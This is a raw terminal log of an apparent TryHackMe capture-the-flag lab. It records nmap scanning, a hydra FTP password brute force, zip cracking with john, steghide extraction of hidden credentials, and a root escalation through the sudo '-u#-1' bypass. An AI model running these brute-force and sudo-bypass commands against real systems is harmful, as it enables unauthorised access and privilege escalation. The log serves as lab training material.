***Phase 1: Enumeration***

```
nmap -sS -sV -A 10.49.137.156    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-06 13:13 -0400
Nmap scan report for 10.49.137.156
Host is up (0.046s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=6/6%OT=21%CT=1%CU=30330%PV=Y%DS=3%DC=T%G=Y%TM=6A24556F
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)SEQ(
OS:SP=103%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%C
OS:I=I%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=A)SEQ(SP=109%GC
OS:D=1%ISR=109%TI=Z%CI=I%II=I%TS=A)OPS(O1=M4E8ST11NW6%O2=M4E8ST11NW6%O3=M4E
OS:8NNT11NW6%O4=M4E8ST11NW6%O5=M4E8ST11NW6%O6=M4E8ST11)WIN(W1=68DF%W2=68DF%
OS:W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M4E8NNSNW6%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
OS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   44.27 ms 192.168.128.1
2   ...
3   45.66 ms 10.49.137.156

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.94 seconds
                                                                
```


```
root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# curl -A "R" -L 10.49.137.156
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>

<body>
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
</body>
</html>
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# curl -A "A" -L 10.49.137.156 

<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>

<body>
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
</body>
</html>
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# curl -A "" -L 10.49.137.156 
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# curl -A "C" -L 10.49.137.156 
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 

                                                                                                                                                     
                                                                                 
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.49.137.156 ftp

Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-06 13:25:08
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.49.137.156:21/
[21][ftp] host: 10.49.137.156   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-06 13:26:05
                                                                                                                                                              

┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# ftp 10.49.147.173 
Connected to 10.49.147.173.
220 (vsFTPd 3.0.3)
Name (10.49.147.173:kali): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||62659|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> mget
(remote-files) To_agentJ.txt
mget To_agentJ.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||43099|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |*****************************************************************************************************************|   217        2.68 MiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (300.58 KiB/s)
ftp> mget cute-alien.jpg
mget cute-alien.jpg [anpqy?]? y
229 Entering Extended Passive Mode (|||21888|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |*****************************************************************************************************************| 33143      557.29 KiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:00 (301.85 KiB/s)
ftp> mget cutie.png
mget cutie.png [anpqy?]? y
229 Entering Extended Passive Mode (|||5642|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |*****************************************************************************************************************| 34842      413.73 KiB/s    00:00 ETA
226 Transfer complete.
34842 bytes received in 00:00 (177.48 KiB/s)
ftp> 
ftp> 
zsh: suspended  ftp 10.49.147.173
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# ls                
500-worst-passwords.txt          best1050.txt    cutie.png                                                otp.txt    shell.php5     usernames_gmail.com.txt
ap-south-1-hrmunna-regular.ovpn  cute-alien.jpg  N1R0M-Jr-Pentester-AD-v01-6a1e8133d0022c23d11cd1c3.ovpn  script.py  To_agentJ.txt
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# cat To_agentJ.txt                                                          
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# binwalk cute-alien.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01

                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# binwalk cutie.png     

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# binwalk -e  cutie.png

Extractor Exception: Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=root' (binwalk itself must be run as root).
----------------------------------------------------------------------------------------------------
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/binwalk/core/module.py", line 258, in __init__
    self.load()
    ~~~~~~~~~^^
  File "/usr/lib/python3/dist-packages/binwalk/modules/extractor.py", line 153, in load
    raise ModuleException("Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=%s' (binwalk itself must be run as root)." % user_info.pw_name)
binwalk.core.exceptions.ModuleException: Binwalk extraction uses many third party utilities, which may not be secure. If you wish to have extraction utilities executed as the current user, use '--run-as=root' (binwalk itself must be run as root).
----------------------------------------------------------------------------------------------------

                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# ls
500-worst-passwords.txt          best1050.txt    cutie.png                                                otp.txt    shell.php5     usernames_gmail.com.txt
ap-south-1-hrmunna-regular.ovpn  cute-alien.jpg  N1R0M-Jr-Pentester-AD-v01-6a1e8133d0022c23d11cd1c3.ovpn  script.py  To_agentJ.txt
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# binwalk -e --run-as=root cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented

                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# ls
500-worst-passwords.txt          cute-alien.jpg        N1R0M-Jr-Pentester-AD-v01-6a1e8133d0022c23d11cd1c3.ovpn  shell.php5
ap-south-1-hrmunna-regular.ovpn  cutie.png             otp.txt                                                  To_agentJ.txt
best1050.txt                     _cutie.png.extracted  script.py                                                usernames_gmail.com.txt
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# cd _cutie.png.extracted 
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme/_cutie.png.extracted]
└─# ls
365  365.zlib  8702.zip
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme/_cutie.png.extracted]
└─# zip2john 8702.zip > zip.hash
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme/_cutie.png.extracted]
└─# ls
365  365.zlib  8702.zip  zip.hash
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme/_cutie.png.extracted]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 7 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE (2026-06-06 15:38) 2.564g/s 73517p/s 73517c/s 73517C/s chanda..spongebob9
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme/_cutie.png.extracted]
└─# 7z e 8702.zip 

7-Zip 26.00 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-02-12
 64-bit locale=en_US.UTF-8 Threads:7 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Enter password (will not be echoed):
Everything is Ok

Size:       86
Compressed: 280
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme/_cutie.png.extracted]
└─# 7z e 8702.zip

7-Zip 26.00 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-02-12
 64-bit locale=en_US.UTF-8 Threads:7 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 08:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 08:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y

                    
Enter password (will not be echoed):
Everything is Ok

Size:       86
Compressed: 280
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme/_cutie.png.extracted]
└─# ls
365  365.zlib  8702.zip  To_agentR.txt  zip.hash
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme/_cutie.png.extracted]
└─# cat To_agentR.txt       
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme/_cutie.png.extracted]
└─# echo 'QXJlYTUx' | base64 -d
Area51                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme/_cutie.png.extracted]
└─# cd ..                   
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# steghide --info  'cute-alien.jpg'
Command 'steghide' not found, but can be installed with:
apt install steghide
Do you want to install it? (N/y)n
                                                                                                                                                              
┌─                                                                                                               
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# steghide --info  'cute-alien.jpg'
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# steghide --info  'cute-alien.jpg'
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# steghide --info  'cute-alien.jpg'
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# steghide --info  'cute-alien.jpg'
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "message.txt":
    size: 181.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# steghide --extract -sf 'cute-alien.jpg'
Enter passphrase: 
wrote extracted data to "message.txt".
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# ls
500-worst-passwords.txt          cute-alien.jpg        message.txt                                              script.py      usernames_gmail.com.txt
ap-south-1-hrmunna-regular.ovpn  cutie.png             N1R0M-Jr-Pentester-AD-v01-6a1e8133d0022c23d11cd1c3.ovpn  shell.php5
best1050.txt                     _cutie.png.extracted  otp.txt                                                  To_agentJ.txt
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# cat message.txt  
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─#                                
```

```
(root㉿kali)-[/home/kali]
└─# ssh james@10.49.147.173              
The authenticity of host '10.49.147.173 (10.49.147.173)' can't be established.
ED25519 key fingerprint is: SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.147.173' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
james@10.49.147.173's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jun  6 20:09:32 UTC 2026

  System load:  0.0               Processes:           97
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 33%               IP address for ens5: 10.49.147.173
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt
{xxxxxxxxxxxxxxxxxxxxxxxx}
james@agent-sudo:~$ pwd
/home/james
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ id
uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
james@agent-sudo:~$ ^C
james@agent-sudo:~$ What is the incident of the photo called?

Command 'What' not found, did you mean:

  command 'chat' from deb ppp
  command 'jhat' from deb openjdk-8-jdk-headless

Try: sudo apt install <deb name>

james@agent-sudo:~$ mget Alien_autospy.jpg 

Command 'mget' not found, but can be installed with:

sudo snap install mget

james@agent-sudo:~$ sudo -l
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
james@agent-sudo:~$ sudo version
sudo: version: command not found
james@agent-sudo:~$ sudo -version
sudo: Only one of the -e, -h, -i, -K, -l, -s, -v or -V options may be specified
usage: sudo -h | -K | -k | -V
usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]
usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
james@agent-sudo:~$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# id
uid=0(root) gid=1000(james) groups=1000(james)
root@agent-sudo:~# ls
Alien_autospy.jpg  user_flag.txt
root@agent-sudo:~# cd ../../
root@agent-sudo:/# ls
bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  swap.img  tmp  var      vmlinuz.old
boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   sys       usr  vmlinuz
root@agent-sudo:/# cd root
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
{xxxxxxxxxxxxxxxxxxxxx}

By,
DesKel a.k.a Agent R
root@agent-sudo:/root# Connection to 10.49.147.173 closed by remote host.
Connection to 10.49.147.173 closed.
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali]
└─# 

```


